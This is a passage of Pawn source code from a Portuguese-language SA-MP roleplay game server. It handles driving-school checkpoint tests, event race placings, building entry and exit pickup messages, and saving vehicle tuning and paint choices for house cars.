				WE_SetInt(gFile, "HabAAviao", 1);
				WE_SaveFile();
				InAutoEscola5[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	switch(Checks6[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints6[1][0], AutoPoints6[1][1], AutoPoints6[1][2],AutoPoints6[1][0], AutoPoints6[1][1], AutoPoints6[1][2], 10);
			Checks6[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints6[1][0], AutoPoints6[1][1], AutoPoints6[1][2],AutoPoints6[1][0], AutoPoints6[1][1], AutoPoints6[1][2], 10);
			Checks6[playerid] = 3;
			return 1;
		}
		case 3:
		{

			if(IsPlayerInVehicle(playerid, carroauto6[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto6[playerid], lataria);
				if(lataria < 900)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO!", 3000, 1);
				pInfo[playerid][HabAHeli] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
				pInfo[playerid][EntrouL] = true;
				WE_SetInt(gFile, "HabAHeli", 1);
				WE_SaveFile();
				InAutoEscola6[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	if(ParticipandoEvento[playerid] == 1)
	{
	    if (SetPlayerCheckPoint[playerid] == UltimoCP-1)
	    {
	        if(AlguemVenceu == 0)
	        {
	            AlguemVenceu = 1;
	            SetPlayerCheckPoint[playerid] = 333333;
		        format(gstring, sizeof(gstring), "%s terminou o evento em 1º lugar e venceu!", PlayerName(playerid));
		        SendClientMessageToAll(VERMELHO_WE, gstring);
		        DisablePlayerRaceCheckpoint(playerid);
		        VencedorNome1 = PlayerName(playerid);
		        Finalizou[playerid] = 1;
		        return 1;
	        }
	        else if(AlguemVenceu == 1)
			{
			    if(AlguemVenceu2 == 0)
			    {
	   	            AlguemVenceu2 = 1;
		            SetPlayerCheckPoint[playerid] = 222222;
			        format(gstring, sizeof(gstring), "%s terminou o evento em 2º lugar!", PlayerName(playerid));
			        SendClientMessageToAll(AZUL_WE, gstring);
			        DisablePlayerRaceCheckpoint(playerid);
			        VencedorNome2 = PlayerName(playerid);
			        Finalizou[playerid] = 1;
			    }
			    else if(AlguemVenceu2 == 1)
			    {
				    if(AlguemVenceu3 == 0)
				    {
		   	            AlguemVenceu3 = 1;
			            SetPlayerCheckPoint[playerid] = 111111;
				        format(gstring, sizeof(gstring), "%s terminou o evento em 3º lugar!", PlayerName(playerid));
				        SendClientMessageToAll(COR_AMARELO, gstring);
				        DisablePlayerRaceCheckpoint(playerid);
				        VencedorNome3 = PlayerName(playerid);
				        Finalizou[playerid] = 1;
				    }
				    else if(AlguemVenceu3 == 1)
				    {
				    	SendClientMessage(playerid, COR_AMARELO, "Você chegou no final do evento mais não foi o vencedor!");
		        		DisablePlayerRaceCheckpoint(playerid);
		        		Finalizou[playerid] = 1;
		        		return 1;
					}
	        	}
			}
	    }
		else
		{
		    SetPlayerCheckPoint[playerid] ++;
		    OnPlayerRaceCheckpoint(playerid, SetPlayerCheckPoint[playerid]);
	 		format(gStr, sizeof(gStr), "~r~~h~Pontos Passados~n~~g~~h~%d ~w~de ~y~~h~%d", SetPlayerCheckPoint[playerid], UltimoCP);
	        GameTextForPlayer(playerid, gStr, 5000, 5);
		}
    }
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
    return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	// Entradas
	if(pickupid == ePick[0]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Delegacia de LS{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[2]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de Los Santos{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[38]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Delegacia SF{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[1]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Alhambra{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[4]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Auto Escola de Los Santos{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[37]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Auto Escola de San Fierro{FFFFFF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[5]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Mercado 24/7{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[6]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Mercado 24/7{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[7]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Loterica{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[8]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Loja de Roupas{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[9]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Ginásio de Lutas{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[10]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Puteiro{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[11]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Bar{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[12]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Pizzaria{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[13]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Burger Shot{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[14]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Cluckin' Bell{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[15]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Prefeitura de Los Santos{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[36]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Prefeitura de San Fierro{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[16]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de San Fierro{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
    else if(pickupid == ePick[17]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de Las Venturas{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
    else if(pickupid == ePick[18]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de Fort Carson{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
    else if(pickupid == ePick[19]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de Blueberry{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
    else if(pickupid == ePick[20]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Agência de Angel Pine{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
    else if(pickupid == ePick[21]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Ammunation{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[22]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Banco{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[23]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Banco{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
 	else if(pickupid == ePick[41]) SendClientMessage(playerid, AZUL_WE, "Para entrar no {FFFFFF}Hotel{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");
	else if(pickupid == ePick[42]) SendClientMessage(playerid, AZUL_WE, "Para entrar na {FFFFFF}Igreja{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/entrar{1E90FF}'.");

	// Saídas
	else if(pickupid == sPick[0]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Delegacia{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[1]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Alhambra{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[2]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Agencia de Empregos{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[3]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Banco{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[4]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Auto Escola{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[5]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Mercado 24/7{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[6]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Mercado 24/7{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[7]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Loterica{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[8]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Loja de Roupas{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[9]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Ginásio de Lutas{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[10]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Puteiro{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[11]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Bar{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[12]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Pizzaria{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[13]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Burger Shot{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[14]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Cluckin' Bell{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[15]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Prefeitura{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[17]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Ammunation{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[20]) SendClientMessage(playerid, AZUL_WE, "Para sair do {FFFFFF}Hotel{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[21]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Delegacia{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == sPick[22]) SendClientMessage(playerid, AZUL_WE, "Para sair da {FFFFFF}Igreja{1E90FF} use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/sair{1E90FF}'.");
	else if(pickupid == ePick[24]) {
		SendClientMessage(playerid, COR_BRANCO, " Duelo ");
		SendClientMessage(playerid, COR_BRANCO, " Para entrar no duelo digite '{FFFFFF}/Duelo{FFFFFF}'.");
		SendClientMessage(playerid, COR_BRANCO, " Duelo ");
	} else if(pickupid == ePick[25]) {
		SendClientMessage(playerid, COR_BRANCO, " RC ");
		SendClientMessage(playerid, COR_BRANCO, " Para entrar no RC digite '{FFFFFF}/EntrarRC{FFFFFF}'.");
		SendClientMessage(playerid, COR_BRANCO, " RC ");
	}
	if(pickupid == ePick[26] && pInfo[playerid][Prof] == POL_CIVIL)
	{
		GameTextForPlayer(playerid, "~h~oficial civil~n~~b~~h~para vestir o colete~n~~w~use: /colete", 5000, 5);
	}
	if(pickupid == ePick[27] && pInfo[playerid][Prof] == POL_CIVIL)
	{
		GameTextForPlayer(playerid, "~h~oficial civil~n~~r~~h~para equipar-se~n~~w~use: /farda", 5000, 5);
	}
	if(pickupid == ePick[28] && pInfo[playerid][Prof] == POL_MILITAR)
	{
		GameTextForPlayer(playerid, "~h~oficial militar~n~~b~~h~para vestir o colete~n~~w~use: /colete", 5000, 5);
	}
	if(pickupid == ePick[29] && pInfo[playerid][Prof] == POL_MILITAR)
	{
		GameTextForPlayer(playerid, "~h~oficial militar~n~~r~~h~para equipar-se~n~~w~use: /farda", 5000, 5);
	}
	if(pickupid == ePick[30] && pInfo[playerid][Prof] == POL_FEDERAL)
	{
		GameTextForPlayer(playerid, "~h~oficial federal~n~~b~~h~para vestir o colete~n~~w~use: /colete", 5000, 5);
	}
	if(pickupid == ePick[31] && pInfo[playerid][Prof] == POL_FEDERAL)
	{
		GameTextForPlayer(playerid, "~h~oficial federal~n~~r~~h~para equipar-se~n~~w~use: /farda", 5000, 5);
	}
	if(pickupid == ePick[32] && pInfo[playerid][Prof] == GUARDA_TRANSITO)
	{
		GameTextForPlayer(playerid, "~h~oficial de transito~n~~b~~h~para vestir o colete~n~~w~use: /colete", 5000, 5);
	}
	if(pickupid == ePick[33] && pInfo[playerid][Prof] == GUARDA_TRANSITO)
	{
		GameTextForPlayer(playerid, "~h~oficial de transito~n~~r~~h~para equipar-se~n~~w~use: /farda", 5000, 5);
	}
	if(pickupid == ePick[34] && pInfo[playerid][Prof] == POL_RODOVIARIO)
	{
		GameTextForPlayer(playerid, "~h~oficial rodoviario~n~~b~~h~para vestir o colete~n~~w~use: /colete", 5000, 5);
	}
	if(pickupid == ePick[35] && pInfo[playerid][Prof] == POL_RODOVIARIO)
	{
		GameTextForPlayer(playerid, "~h~oficial rodoviario~n~~r~~h~para equipar-se~n~~w~use: /farda", 5000, 5);
	}
	// Entradas casas e empresas
	for(new c; c < MAX_CASAS; ++c)
	{
	    if(pickupid == CasaPickup[c])
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
	        {
	            if(pInfo[playerid][Prof] != BOMBEIRO)
	            {
					SendClientMessage(playerid, COR_BRANCO, "{1E90FF}Para entrar na casa use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/casa entrar{1E90FF}'.");
			       	HousePickup[playerid] = gettime();
			       	InHousePickup[playerid] = c;
		       	}
		       	else
		       	{
			    	SendClientMessage(playerid, COR_BRANCO, "{1E90FF}Para entrar na casa use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/casa entrar{1E90FF}'.");
			       	HousePickup[playerid] = gettime();
			       	InHousePickup[playerid] = c;
		       	}
		    	break;
	        }
	    }
	}

  	for(new m = 1; m < MAX_EMPRESAS; ++m)
	{
	    if(pickupid == EmpresaPickup[m])
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 3, EmpresaInfo[m][PickupX], EmpresaInfo[m][PickupY], EmpresaInfo[m][PickupZ]))
	        {
	            InCompanyPickup[playerid] = m;
				SendClientMessage(playerid, 0xFFFFFFAA, "{1E90FF}Para entrar na empresa use '{FFFFFF}F{1E90FF}' ou '{FFFFFF}/empresa entrar{1E90FF}'.");
				CompanyPickup[playerid] = gettime();
				break;
	        }
	    }
	}
	return 1;
}

public OnEnterExitModShop(playerid, enterexit, interiorid)
{
    if(enterexit == 1) // Se entrar
    {
        SendClientMessage(playerid, COR_AMARELO, "Seja bem-vindo(a) à transfender.");
    }
    /*if(enterexit == 0) // Se sair
    {
    }*/
    return 1;
}

stock veiculoCasa(vehicleid, playerid)
{
	for(new c; c < sizeof(cInfo); ++c)
	{
		if(vehicleid == cInfo[c][HouseCar] && !strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
		{
			return 1;
		}
	}
	return 0;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	if(GetPlayerCash(playerid) >= 1000)
	{
		for(new c; c < sizeof(cInfo); ++c)
		{
			if(vehicleid == cInfo[c][HouseCar])
			{
				if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
				{
					new
						vStr[128]
					;
					format(vStr, sizeof(vStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);
					if(fexist(vStr))
					{
						if(eNitro(componentid))
						{
							WE_SetInt(vStr, "Nitro", componentid);
							cInfo[CasaInfo[c][Numero]][t_Nitro] = componentid;
						}
						if(eRoda(componentid))
						{
							WE_SetInt(vStr, "Roda", componentid);
							cInfo[CasaInfo[c][Numero]][t_Roda] = componentid;
						}
						if(eSpoiler(componentid))
						{
							WE_SetInt(vStr, "Spoiler", componentid);
							cInfo[CasaInfo[c][Numero]][t_Spoiler] = componentid;
						}
						if(eHydraulico(componentid))
						{
							WE_SetInt(vStr, "Hydraulico", componentid);
							cInfo[CasaInfo[c][Numero]][t_Hydraulico] = componentid;
						}
						if(eParachoqueDianteiro(componentid))
						{
							WE_SetInt(vStr, "ParachoqueDianteiro", componentid);
							cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro] = componentid;
						}
						if(eParachoqueTraseiro(componentid))
						{
							WE_SetInt(vStr, "ParachoqueTraseiro", componentid);
							cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro] = componentid;
						}
						if(eEscapamento(componentid))
						{
							WE_SetInt(vStr, "Escapamento", componentid);
							cInfo[CasaInfo[c][Numero]][t_Escapamento] = componentid;
						}
						if(eBventr(componentid))
						{
							WE_SetInt(vStr, "Bventr", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bventr] = componentid;
						}
						if(eBventl(componentid))
						{
							WE_SetInt(vStr, "Bventl", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bventl] = componentid;
						}
						if(eBscoop(componentid))
						{
							WE_SetInt(vStr, "Bscoop", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bscoop] = componentid;
						}
						if(eRscoop(componentid))
						{
							WE_SetInt(vStr, "Rscoop", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rscoop] = componentid;
						}
						if(eLskirt(componentid))
						{
							WE_SetInt(vStr, "Lskirt", componentid);
							cInfo[CasaInfo[c][Numero]][t_Lskirt] = componentid;
						}
						if(eRskirt(componentid))
						{
							WE_SetInt(vStr, "Rskirt", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rskirt] = componentid;
						}
						if(eBase(componentid))
						{
							WE_SetInt(vStr, "Base", componentid);
							cInfo[CasaInfo[c][Numero]][t_Base] = componentid;
						}
						if(eRbbars(componentid))
						{
							WE_SetInt(vStr, "Rbbars", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rbbars] = componentid;
						}
						if(eFbbars(componentid))
						{
							WE_SetInt(vStr, "Fbbars", componentid);
							cInfo[CasaInfo[c][Numero]][t_Fbbars] = componentid;
						}
						if(eLights(componentid))
						{
							WE_SetInt(vStr, "Lights", componentid);
							cInfo[CasaInfo[c][Numero]][t_Lights] = componentid;
						}
					}
					else
					{
					    WE_CreateFile(vStr);
						if(eNitro(componentid))
						{
							WE_SetInt(vStr, "Nitro", componentid);
							cInfo[CasaInfo[c][Numero]][t_Nitro] = componentid;
						}
						if(eRoda(componentid))
						{
							WE_SetInt(vStr, "Roda", componentid);
							cInfo[CasaInfo[c][Numero]][t_Roda] = componentid;
						}
						if(eSpoiler(componentid))
						{
							WE_SetInt(vStr, "Spoiler", componentid);
							cInfo[CasaInfo[c][Numero]][t_Spoiler] = componentid;
						}
						if(eHydraulico(componentid))
						{
							WE_SetInt(vStr, "Hydraulico", componentid);
							cInfo[CasaInfo[c][Numero]][t_Hydraulico] = componentid;
						}
						if(eParachoqueDianteiro(componentid))
						{
							WE_SetInt(vStr, "ParachoqueDianteiro", componentid);
							cInfo[CasaInfo[c][Numero]][t_ParachoqueDianteiro] = componentid;
						}
						if(eParachoqueTraseiro(componentid))
						{
							WE_SetInt(vStr, "ParachoqueTraseiro", componentid);
							cInfo[CasaInfo[c][Numero]][t_ParachoqueTraseiro] = componentid;
						}
						if(eEscapamento(componentid))
						{
							WE_SetInt(vStr, "Escapamento", componentid);
							cInfo[CasaInfo[c][Numero]][t_Escapamento] = componentid;
						}
						if(eBventr(componentid))
						{
							WE_SetInt(vStr, "Bventr", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bventr] = componentid;
						}
						if(eBventl(componentid))
						{
							WE_SetInt(vStr, "Bventl", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bventl] = componentid;
						}
						if(eBscoop(componentid))
						{
							WE_SetInt(vStr, "Bscoop", componentid);
							cInfo[CasaInfo[c][Numero]][t_Bscoop] = componentid;
						}
						if(eRscoop(componentid))
						{
							WE_SetInt(vStr, "Rscoop", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rscoop] = componentid;
						}
						if(eLskirt(componentid))
						{
							WE_SetInt(vStr, "Lskirt", componentid);
							cInfo[CasaInfo[c][Numero]][t_Lskirt] = componentid;
						}
						if(eRskirt(componentid))
						{
							WE_SetInt(vStr, "Rskirt", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rskirt] = componentid;
						}
						if(eBase(componentid))
						{
							WE_SetInt(vStr, "Base", componentid);
							cInfo[CasaInfo[c][Numero]][t_Base] = componentid;
						}
						if(eRbbars(componentid))
						{
							WE_SetInt(vStr, "Rbbars", componentid);
							cInfo[CasaInfo[c][Numero]][t_Rbbars] = componentid;
						}
						if(eFbbars(componentid))
						{
							WE_SetInt(vStr, "Fbbars", componentid);
							cInfo[CasaInfo[c][Numero]][t_Fbbars] = componentid;
						}
						if(eLights(componentid))
						{
							WE_SetInt(vStr, "Lights", componentid);
							cInfo[CasaInfo[c][Numero]][t_Lights] = componentid;
						}
					}
					if(pInfo[playerid] [PLAYER_VIP] == 0)
					{
						sGivePlayerCash(playerid, -1000);
					}
					return 1;
				}
			}
		}
	}
    return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	if(GetPlayerCash(playerid) >= 1000)
	{
		for(new c; c < sizeof(cInfo); ++c)
		{
			if(vehicleid == cInfo[c][HouseCar])
			{
				if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
				{
					new
						vStr[128]
					;
					format(vStr, sizeof(vStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);

					if(fexist(vStr))
					{
					    WE_SetInt(vStr, "PaintJob", paintjobid);
					    cInfo[CasaInfo[c][Numero]][t_PaintJob] = paintjobid;
					}
					else
					{
					    WE_CreateFile(vStr);
	   					WE_SetInt(vStr, "PaintJob", paintjobid);
					    cInfo[CasaInfo[c][Numero]][t_PaintJob] = paintjobid;
					}
					if(pInfo[playerid] [PLAYER_VIP] == 0)
					{
						sGivePlayerCash(playerid, -1000);
					}
					return 1;
				}
			}
		}
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	if(GetPlayerCash(playerid) >= 100)
	{
		for(new c; c < sizeof(cInfo); ++c)
		{
			if(vehicleid == cInfo[c][HouseCar])
			{
				if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
				{
					new
						vStr[128]
					;
					format(vStr, sizeof(vStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);

					if(fexist(vStr))
					{
					    WE_SetInt(vStr, "Cor1", color1);
					    WE_SetInt(vStr, "Cor2", color2);
					    cInfo[CasaInfo[c][Numero]][t_Cor_1] = color1;
					    cInfo[CasaInfo[c][Numero]][t_Cor_2] = color2;
					}
					else
					{
					    WE_CreateFile(vStr);
	   					WE_SetInt(vStr, "Cor1", color1);
					    WE_SetInt(vStr, "Cor2", color2);
					    cInfo[CasaInfo[c][Numero]][t_Cor_1] = color1;
					    cInfo[CasaInfo[c][Numero]][t_Cor_2] = color2;
					}
					if(pInfo[playerid] [PLAYER_VIP] == 0)
					{
						sGivePlayerCash(playerid, -100);
					}
					return 1;
				}
			}
		}
	}
	return 1;
}

stock GetComponentName(componentid) return ModName[componentid-1000]; // by BigETI

stock IsVehicleUpgradeCompatible(model,componentid) // by AirKite
{
	switch(model)
	{
		case 400:
		{
			switch(componentid)
			{
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1018: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1021: { return 1; }
				case 1024: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
			}
		}
		case 401:
		{
			switch(componentid)
			{
				case 1001: { return 1; }
				case 1003: { return 1; }
				case 1004: { return 1; }
				case 1005: { return 1; }
				case 1006: { return 1; }
				case 1007: { return 1; }
				case 1008: { return 1; }
				case 1009: { return 1; }
				case 1010: { return 1; }
				case 1013: { return 1; }
				case 1017: { return 1; }
				case 1019: { return 1; }
				case 1020: { return 1; }
				case 1025: { return 1; }
				case 1073: { return 1; }
				case 1074: { return 1; }
				case 1075: { return 1; }
				case 1076: { return 1; }
				case 1077: { return 1; }
				case 1078: { return 1; }
				case 1079: { return 1; }
				case 1080: { return 1; }
				case 1081: { return 1; }
				case 1082: { return 1; }
				case 1083: { return 1; }
				case 1084: { return 1; }
				case 1085: { return 1; }
				case 1087: { return 1; }
				case 1096: { return 1; }
				case 1097: { return 1; }
				case 1098: { return 1; }
				case 1142: { return 1; }
				case 1143: { return 1; }
				case 1144: { return 1; }
			}
		}
		case 404:
		{
			switch(componentid)
			{
